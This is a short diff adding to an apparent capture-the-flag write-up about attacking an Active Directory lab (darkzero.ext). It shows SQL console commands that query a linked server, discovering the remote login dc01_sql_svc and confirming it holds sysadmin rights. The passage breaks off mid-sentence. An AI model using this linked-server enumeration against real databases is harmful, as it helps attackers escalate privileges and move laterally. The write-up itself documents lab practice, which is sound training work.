@@ -287,4 +287,22 @@ DC02.darkzero.ext   darkzero\john.w             False   dc01_sql_svc
 
 Looks like there is a linked server
 
+```python
+SQL (darkzero\john.w  guest@master)> EXEC ('SELECT SYSTEM_USER') AT [DC02.darkzero.ext]
+               
+------------   
+dc01_sql_svc   
+SQL (darkzero\john.w  guest@master)>
+```
 
+I am running as the `dc01_sql_svc` user on the linked server
+
+```python
+SQL (darkzero\john.w  guest@master)> EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
+    
+-   
+1   
+SQL (darkzero\john.w  guest@master)> 
+```
+
+It looks like
